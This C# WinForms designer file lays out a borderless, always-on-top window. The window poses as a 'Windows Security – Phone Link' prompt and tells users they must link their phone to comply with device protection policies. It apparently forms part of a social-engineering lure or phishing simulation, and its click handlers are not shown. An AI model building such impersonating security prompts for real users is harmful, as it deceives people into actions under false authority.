namespace TriggerPhoneLink
{
    partial class Form1
    {
        private System.ComponentModel.IContainer components = null;

        private System.Windows.Forms.Label labelHeaderTitle;
        private System.Windows.Forms.Label labelSubtitle;
        private System.Windows.Forms.Label labelTitle;
        private System.Windows.Forms.Label labelDescription;
        private System.Windows.Forms.Label labelFeatures;
        private System.Windows.Forms.Button connectButton;
        private System.Windows.Forms.PictureBox pictureBoxPhoneIcon;
        private System.Windows.Forms.PictureBox pictureBoxShieldIcon;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null)) components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.labelHeaderTitle = new System.Windows.Forms.Label();
            this.labelSubtitle = new System.Windows.Forms.Label();
            this.labelTitle = new System.Windows.Forms.Label();
            this.labelDescription = new System.Windows.Forms.Label();
            this.labelFeatures = new System.Windows.Forms.Label();
            this.connectButton = new System.Windows.Forms.Button();
            this.pictureBoxPhoneIcon = new System.Windows.Forms.PictureBox();
            this.pictureBoxShieldIcon = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxPhoneIcon)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxShieldIcon)).BeginInit();
            this.SuspendLayout();
            // 
            // labelHeaderTitle
            // 
            this.labelHeaderTitle.AutoSize = true;
            this.labelHeaderTitle.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.labelHeaderTitle.ForeColor = System.Drawing.Color.Black;
            this.labelHeaderTitle.Location = new System.Drawing.Point(12, 9);
            this.labelHeaderTitle.Name = "labelHeaderTitle";
            this.labelHeaderTitle.Size = new System.Drawing.Size(213, 20);
            this.labelHeaderTitle.TabIndex = 2;
            this.labelHeaderTitle.Text = "Windows Security – Phone Link";
            // 
            // labelSubtitle
            // 
            this.labelSubtitle.AutoSize = true;
            this.labelSubtitle.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Italic);
            this.labelSubtitle.ForeColor = System.Drawing.Color.Black;
            this.labelSubtitle.Location = new System.Drawing.Point(413, 63);
            this.labelSubtitle.Name = "labelSubtitle";
            this.labelSubtitle.Size = new System.Drawing.Size(170, 19);
            this.labelSubtitle.TabIndex = 3;
            this.labelSubtitle.Text = "For Both Android and iOS";
            // 
            // labelTitle
            // 
            this.labelTitle.AutoSize = true;
            this.labelTitle.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.labelTitle.Location = new System.Drawing.Point(53, 171);
            this.labelTitle.Name = "labelTitle";
            this.labelTitle.Size = new System.Drawing.Size(558, 25);
            this.labelTitle.TabIndex = 4;
            this.labelTitle.Text = "Action Required: Enable Secure Phone–Computer Integration";
            this.labelTitle.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            this.labelTitle.Click += new System.EventHandler(this.labelTitle_Click);
            // 
            // labelDescription
            // 
            this.labelDescription.AutoSize = true;
            this.labelDescription.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.labelDescription.Location = new System.Drawing.Point(36, 229);
            this.labelDescription.Name = "labelDescription";
            this.labelDescription.Size = new System.Drawing.Size(644, 20);
            this.labelDescription.TabIndex = 5;
            this.labelDescription.Text = "To comply with current device protection policies, you must link your phone with " +
    "your computer.";
            this.labelDescription.Click += new System.EventHandler(this.labelDescription_Click_3);
            // 
            // labelFeatures
            // 
            this.labelFeatures.AutoSize = true;
            this.labelFeatures.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.labelFeatures.Location = new System.Drawing.Point(54, 292);
            this.labelFeatures.Name = "labelFeatures";
            this.labelFeatures.Size = new System.Drawing.Size(603, 140);
            this.labelFeatures.TabIndex = 6;
            this.labelFeatures.Text = resources.GetString("labelFeatures.Text");
            this.labelFeatures.Click += new System.EventHandler(this.labelFeatures_Click);
            // 
            // connectButton
            // 
            this.connectButton.BackColor = System.Drawing.Color.White;
            this.connectButton.FlatAppearance.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(40)))), ((int)(((byte)(92)))));
            this.connectButton.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.connectButton.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.connectButton.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(40)))), ((int)(((byte)(92)))));
            this.connectButton.Location = new System.Drawing.Point(209, 491);
            this.connectButton.Name = "connectButton";
            this.connectButton.Size = new System.Drawing.Size(160, 40);
            this.connectButton.TabIndex = 7;
            this.connectButton.Text = "Open Phone Link";
            this.connectButton.UseVisualStyleBackColor = false;
            this.connectButton.Click += new System.EventHandler(this.connectButton_Click);
            // 
            // pictureBoxPhoneIcon
            // 
            this.pictureBoxPhoneIcon.BackColor = System.Drawing.Color.LightGray;
            this.pictureBoxPhoneIcon.Image = ((System.Drawing.Image)(resources.GetObject("pictureBoxPhoneIcon.Image")));
            this.pictureBoxPhoneIcon.Location = new System.Drawing.Point(137, 117);
            this.pictureBoxPhoneIcon.Name = "pictureBoxPhoneIcon";
            this.pictureBoxPhoneIcon.Size = new System.Drawing.Size(36, 36);
            this.pictureBoxPhoneIcon.TabIndex = 0;
            this.pictureBoxPhoneIcon.TabStop = false;
            // 
            // pictureBoxShieldIcon
            // 
            this.pictureBoxShieldIcon.BackColor = System.Drawing.Color.Transparent;
            this.pictureBoxShieldIcon.Image = ((System.Drawing.Image)(resources.GetObject("pictureBoxShieldIcon.Image")));
            this.pictureBoxShieldIcon.Location = new System.Drawing.Point(407, 115);
            this.pictureBoxShieldIcon.Name = "pictureBoxShieldIcon";
            this.pictureBoxShieldIcon.Size = new System.Drawing.Size(38, 38);
            this.pictureBoxShieldIcon.TabIndex = 1;
            this.pictureBoxShieldIcon.TabStop = false;
            this.pictureBoxShieldIcon.Click += new System.EventHandler(this.pictureBoxShieldIcon_Click);
            // 
            // Form1
            // 
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(580, 563);
            this.ControlBox = false;
            this.Controls.Add(this.pictureBoxShieldIcon);
            this.Controls.Add(this.labelHeaderTitle);
            this.Controls.Add(this.labelSubtitle);
            this.Controls.Add(this.labelTitle);
            this.Controls.Add(this.labelDescription);
            this.Controls.Add(this.labelFeatures);
            this.Controls.Add(this.connectButton);
            this.Controls.Add(this.pictureBoxPhoneIcon);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Phone Link";
            this.TopMost = true;
            this.Load += new System.EventHandler(this.Form1_Load_1);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxPhoneIcon)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBoxShieldIcon)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }
    }
}
